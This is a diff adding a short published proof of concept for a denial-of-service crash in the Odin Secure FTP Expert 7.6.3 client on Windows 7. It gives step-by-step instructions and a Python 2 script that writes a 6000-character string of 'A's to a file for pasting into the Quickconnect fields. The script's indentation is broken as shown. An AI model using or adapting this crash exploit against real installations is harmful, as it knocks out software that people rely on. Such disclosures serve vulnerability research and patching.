@@ -1,0 +1,32 @@
+# Exploit Title : Odin Secure FTP Expert 7.6.3 - Denial of Service (PoC)
+# Exploit Author : Berat Isler
+# Date : 2020-02-25
+# Vendor Homepage : https://odin-secure-ftp-expert.jaleco.com/
+# Software Link Download :
+http://tr.oldversion.com/windows/odin-secure-ftp-expert-7-6-3
+# Version : Odin Secure FTP Expert 7.6.3
+# Tested on : Windows 7 32-bit
+
+# First step , run exploit script, it will generate a new file with the
+name "bune.txt"
+# Then start Odin Secure FTP application and find the "connect" tab . After
+that you can click
+Quickconnect site tab.
+# After that paste the content of "bune.txt" in to the all fields like this
+--> "AAAAAA" than click connect button
+# Application will be crash .
+
+This is the generated payload code :
+
+#!/usr/bin/python
+
+bune = "A" * 6000
+payload = bune
+try:
+f=open("bune.txt","w")
+print "[+] Creating %s bytes payload generated .. .. .." %len(payload)
+f.write(payload)
+f.close()
+print "[+] File created "
+except:
+print "File cannot be created"
